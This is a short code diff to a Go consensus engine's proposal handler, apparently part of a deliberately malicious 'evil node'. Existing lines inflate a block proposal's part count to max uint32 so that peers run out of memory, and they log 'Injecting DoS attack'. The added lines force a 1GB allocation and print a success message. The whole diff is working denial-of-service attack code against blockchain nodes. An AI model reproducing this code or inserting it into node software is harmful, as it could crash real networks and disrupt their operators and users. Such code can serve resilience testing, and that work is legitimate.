@@ -2367,6 +2367,11 @@ func (cs *State) defaultSetProposal(proposal *types.Proposal, recvTime time.Time
 	if proposal != nil {
 		originalTotal := proposal.BlockID.PartSetHeader.Total
 		proposal.BlockID.PartSetHeader.Total = 4294967295 // Max uint32 - will cause OOM
+
+		// Force immediate memory allocation test
+		testBytes := make([]byte, 1024*1024*1024) // Allocate 1GB immediately
+		_ = testBytes[len(testBytes)-1]           // Force actual allocation
+		fmt.Println("EVIL NODE: Allocated 1GB test memory successfully")
 		fmt.Println("EVIL NODE: Injecting DoS attack",
 			"original_total", originalTotal,
 			"malicious_total", proposal.BlockID.PartSetHeader.Total,
